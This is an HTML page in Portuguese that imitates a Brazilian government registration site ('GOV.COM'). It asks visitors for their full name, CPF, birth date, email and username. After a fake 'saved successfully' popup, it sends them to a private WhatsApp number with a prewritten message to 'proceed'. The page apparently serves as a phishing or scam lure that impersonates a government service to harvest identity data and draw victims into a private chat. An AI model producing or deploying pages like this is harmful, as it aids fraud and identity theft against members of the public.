<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cadastro GOV.COM</title>
    <link rel="stylesheet" href="style.css">
    <!-- Adicionando Google Fonts para a fonte Cinzel -->
    <link href="https://fonts.googleapis.com/css2?family=Cinzel&display=swap" rel="stylesheet">
</head>
<body>
    <header>
        <h1>Preencha os dados corretamente</h1>
        <p>Dados para consulta no <span>GOV</span>.</p>
    </header>
    
    <section class="container">
        <h2>Cadastro</h2>
        <form id="cadastroForm">
            <label for="nome">Nome:</label>
            <input type="text" id="nome" required>

            <label for="cpf">CPF:</label>
            <input type="text" id="cpf" required>

            <label for="dataNascimento">Data de Nascimento:</label>
            <input type="date" id="dataNascimento" required>

            <label for="email">E-mail:</label>
            <input type="email" id="email" required>

            <label for="nomeUsuario">Nome do usuário:</label>
            <input type="text" id="nomeUsuario" required>

            <div class="botoes">
                <a class="animated-button" href="#" onclick="abrirPopup()">Salvar</a>,
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                </a>
            </div>
        </form>
    </section>

    <footer>
        <p>© 2025 Consulta GOV.COM. Todos os direitos reservados.</p>
    </footer>

    <div id="popup" class="popup">
  <div class="popup-box">
    <p>Salvo com sucesso!</p>
    <a href="https://wa.me/21990266377?text=Ola Finalizei meu cadastro, QUERO PROSSEGUIR" target="_blank">Clique aqui para ir ao WhatsApp</a>
    <button onclick="fecharPopup()">Fechar</button>
  </div>
</div>

<script>
function abrirPopup() {
    document.getElementById("popup").style.display = "flex";
}

function fecharPopup() {
    document.getElementById("popup").style.display = "none";
}
</script>

</body>
</html>
